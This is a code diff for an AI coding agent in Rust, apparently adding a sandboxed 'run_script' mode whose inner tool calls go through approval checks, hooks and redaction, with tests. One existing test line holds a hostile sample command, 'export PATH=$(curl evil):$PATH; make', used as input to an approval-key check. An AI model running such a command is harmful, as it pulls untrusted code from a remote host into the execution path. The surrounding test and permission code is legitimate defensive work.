@@ -1003,6 +1003,15 @@ or if you are not sure. Reply with exactly one word: SAFE or ASK.",
                 }
             } else {
                 for (i, call) in &to_execute {
+                    if call.name == "run_script" {
+                        // Code Mode: the script's tool calls run here, through
+                        // the same checks (it watches for cancel itself).
+                        results[*i] = Some(self.run_script(call, workspace_root).await);
+                        if self.is_cancelled() {
+                            break;
+                        }
+                        continue;
+                    }
                     tokio::select! {
                         result = self.tools.execute(call) => results[*i] = Some(result),
                         _ = self.cancelled() => break,
@@ -1212,6 +1221,26 @@ or if you are not sure. Reply with exactly one word: SAFE or ASK.",
     /// if one ran.
     pub fn compacted_this_turn(&self) -> Option<usize> {
         self.compacted_this_turn
+    }
+
+    /// Keep this conversation's prompt cache warm (see
+    /// [`crate::provider::Provider::keep_warm`]); the request counts as the
+    /// last one, and its tokens are added to the cost.
+    pub async fn keep_warm(
+        &mut self,
+        workspace_root: &std::path::Path,
+    ) -> Result<Option<crate::provider::KeepWarm>, crate::provider::ProviderError> {
+        let tools = self.tool_definitions();
+        let r = self
+            .provider
+            .keep_warm(&self.messages, &tools, &self.model, workspace_root)
+            .await?;
+        if let Some(k) = r {
+            self.last_request_at = Some(std::time::Instant::now());
+            self.cost_tracker.add(k.input, 0);
+            self.cost_tracker.add_cache(k.cache_read, k.cache_write);
+        }
+        Ok(r)
     }
 
     /// How long since the last model request (`None` before the first).
@@ -1560,6 +1589,125 @@ Take it into account now and continue with the task."
 
     fn is_cancelled(&self) -> bool {
         self.cancel_flag.load(Ordering::SeqCst)
+    }
+
+    /// Runs a `run_script` call: the script on its own thread, each tool it
+    /// calls here — only if the session allows it without asking, through
+    /// hooks, undo checkpoints and redaction like any call.
+    async fn run_script(&mut self, call: &ToolCall, workspace_root: &Path) -> ToolResult {
+        use crate::tools::run_script::{self as rs, ScriptMsg};
+        let fail = |e: String| ToolResult {
+            call_id: call.id.clone(),
+            success: false,
+            output: String::new(),
+            error: Some(e),
+        };
+        let Some(code) = call.input.get("code").and_then(|v| v.as_str()) else {
+            return fail("run_script needs `code`".into());
+        };
+        let (tx, mut rx) = tokio::sync::mpsc::unbounded_channel();
+        let code = code.to_string();
+        let spawned = std::thread::Builder::new()
+            .name("run_script".into())
+            .stack_size(16 * 1024 * 1024)
+            .spawn(move || rs::run(code, tx));
+        if let Err(e) = spawned {
+            return fail(format!("couldn't start the script: {e}"));
+        }
+        let mut n = 0u32;
+        loop {
+            let msg = tokio::select! {
+                m = rx.recv() => m,
+                _ = self.cancelled() => return fail("cancelled".into()),
+            };
+            match msg {
+                Some(ScriptMsg::Call { name, args, reply }) => {
+                    n += 1;
+                    let inner = ToolCall {
+                        id: format!("{}.{n}", call.id),
+                        name,
+                        input: args,
+                    };
+                    let answer = self.script_tool_call(&inner, workspace_root).await;
+                    let _ = reply.send(answer);
+                }
+                Some(ScriptMsg::Done(Ok(out))) => {
+                    return ToolResult {
+                        call_id: call.id.clone(),
+                        success: true,
+                        output: if out.trim().is_empty() {
+                            format!(
+                                "(script finished; {n} tool calls, nothing printed or returned)"
+                            )
+                        } else {
+                            out
+                        },
+                        error: None,
+                    };
+                }
+                Some(ScriptMsg::Done(Err(e))) => return fail(e),
+                None => return fail("the script stopped unexpectedly".into()),
+            }
+        }
+    }
+
+    /// One tool call from inside a script → its text, or why it can't run.
+    async fn script_tool_call(
+        &mut self,
+        call: &ToolCall,
+        workspace_root: &Path,
+    ) -> Result<String, String> {
+        if call.name == "run_script" {
+            return Err("scripts can't start scripts".into());
+        }
+        match self.approval.check(&call.name, &call.input.to_string()) {
+            PermissionTier::Allowed => {}
+            PermissionTier::Denied => return Err(format!("tool `{}` denied by policy", call.name)),
+            PermissionTier::Ask => {
+                return Err(format!(
+                    "`{}` needs your approval in this mode — call it directly, not from a script",
+                    call.name
+                ));
+            }
+        }
+        if let Some(hooks) = &self.hooks
+            && let Err(reason) = hooks
+                .run(
+                    HookEventKind::PreToolUse,
+                    Some(&call.name),
+                    &json!({"call_id": call.id, "tool": call.name, "input": call.input}),
+                )
+                .await
+        {
+            return Err(reason);
+        }
+        self.undo.record_tool_call(call, workspace_root);
+        let mut result = self.tools.execute(call).await;
+        dcode_ai_common::redact::redact_tool_result(&mut result);
+        self.undo
+            .note_results(std::slice::from_ref(call), std::slice::from_ref(&result));
+        if let Some(hooks) = &self.hooks {
+            let kind = if result.success {
+                HookEventKind::PostToolUse
+            } else {
+                HookEventKind::PostToolFailure
+            };
+            hooks
+                .run_best_effort(
+                    kind,
+                    None,
+                    &json!({"call_id": result.call_id, "success": result.success,
+                            "output": result.output, "error": result.error}),
+                )
+                .await;
+        }
+        if result.success {
+            Ok(result.output)
+        } else {
+            Err(result
+                .error
+                .unwrap_or_else(|| format!("`{}` failed", call.name)))
+        }
     }
 
     /// Returns a future that completes when cancellation is requested.
@@ -2002,6 +2150,67 @@ mod tests {
             verdict_key("export PATH=$(curl evil):$PATH; make"),
             "export PATH=$(curl evil):$PATH; make"
         );
+    }
+
+    /// A tool answering "read <path>".
+    struct EchoRead;
+
+    #[async_trait]
+    impl crate::tools::ToolExecutor for EchoRead {
+        fn definition(&self) -> ToolDefinition {
+            ToolDefinition {
+                name: "read_file".into(),
+                description: String::new(),
+                parameters: json!({}),
+            }
+        }
+        async fn execute(&self, call: &ToolCall) -> ToolResult {
+            ToolResult {
+                call_id: call.id.clone(),
+                success: true,
+                output: format!("read {}", call.input["path"].as_str().unwrap_or("")),
+                error: None,
+            }
+        }
+    }
+
+    /// Code Mode: a script's calls run through the agent; one that needs
+    /// approval fails inside the script instead of prompting.
+    #[tokio::test]
+    async fn run_script_calls_allowed_tools_and_refuses_the_rest() {
+        let (event_tx, _event_rx) = tokio::sync::mpsc::channel(64);
+        let mut tools = ToolRegistry::new();
+        tools.register(Box::new(EchoRead));
+        let mut agent = AgentLoop::new(
+            Box::new(ChunkProvider {
+                chunks: Mutex::new(VecDeque::new()),
+            }),
+            tools,
+            ApprovalPolicy::new(PermissionConfig::default()),
+            "test-model".into(),
+            event_tx,
+            3,
+            3,
+            1,
+            None,
+        );
+        let temp = tempfile::tempdir().expect("tempdir");
+        let call = ToolCall {
+            id: "s1".into(),
+            name: "run_script".into(),
+            input: json!({"code": "const a = ['x', 'y'].map(p => tools.read_file({path: p}));\n\
+                let w; try { tools.write_file({path: 'z', content: ''}); } catch (e) { w = e.message; }\n\
+                return {a, w};"}),
+        };
+        let r = agent.run_script(&call, temp.path()).await;
+        assert!(r.success, "{r:?}");
+        assert!(
+            r.output.contains("read x") && r.output.contains("read y"),
+            "{}",
+            r.output
+        );
+        assert!(r.output.contains("needs your approval"), "{}", r.output);
+        assert!(!temp.path().join("z").exists());
     }
 
     /// A reply stuck repeating one line is stopped and kept to one copy.
